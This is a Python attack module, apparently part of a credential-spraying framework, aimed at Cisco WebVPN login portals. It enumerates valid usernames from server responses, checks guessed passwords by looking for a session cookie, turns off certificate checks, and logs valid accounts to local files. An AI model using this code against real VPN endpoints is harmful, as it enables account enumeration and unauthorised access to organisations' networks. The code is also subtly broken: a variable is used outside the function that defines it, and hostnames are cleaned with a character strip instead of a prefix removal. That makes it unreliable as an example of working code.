#! /usr/bin/python
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
import random

class ciscoVPN(webModule):
    def __init__(self, config, display, lock):
        super(ciscoVPN, self).__init__(config, display, lock)
        self.fingerprint="CSCOE"
        self.response=""
        self.protocol="web"
    def somethingCool(self, config, payload, check):
        if 'a0=24' in check:
            host = config["HOST"]
            if 'https' in host:
                host = host.strip('https://')
            else:
                host = host.strip('http://')
            if '/' in host:
                host = re.sub(r'/s\w+', '', host)
            saveFile = './tmp/validusers-ciscoVPN-' + host + '.txt'
            print("[+]  " + config["USERNAME"] + " is a valid user! Adding to valid user file (" + saveFile + ")...")
            f = open(saveFile, 'a')
            f.write(config["USERNAME"] + '\n')
            f.close()
        else:
            print("[-]  " + config["USERNAME"] + " is not a valid user account...")
    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        with session() as c:
            resp1 = c.get(config["HOST"] + '/+CSCOE+/logon.html', verify=False, proxies=proxy)
            cookies = resp1.cookies
            cpost = c.post(config["HOST"] + '/+webvpn+/index.html', cookies=cookies, data=payload, allow_redirects=True, verify=False, proxies=proxy)
            check = cpost.text
            if not config["dry_run"]:
                print("[!] Time to do something cool! Checking if user is valid...")
                self.somethingCool(config, payload, check)
            m = re.search('Set-Cookie: webvpnx', str(cpost.headers))
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Adding to valid user file (" + saveFile + ")...")
                f = open(saveFile, 'a')
                f.write(config["USERNAME"] + '\n')
                f.close()
